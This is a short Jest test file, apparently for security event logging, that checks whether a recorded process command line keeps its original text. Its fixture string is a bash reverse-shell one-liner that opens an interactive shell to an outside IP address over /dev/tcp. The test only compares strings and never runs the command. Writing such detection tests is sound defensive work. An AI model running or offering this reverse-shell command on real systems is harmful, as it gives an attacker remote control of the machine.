import { test, expect } from '@jest/globals';
test('preserves process command', () => {
  const event = { command_line: 'bash -i >& /dev/tcp/203.0.113.7/4444 0>&1' };
  expect(event.command_line).toContain('/dev/tcp/');
});
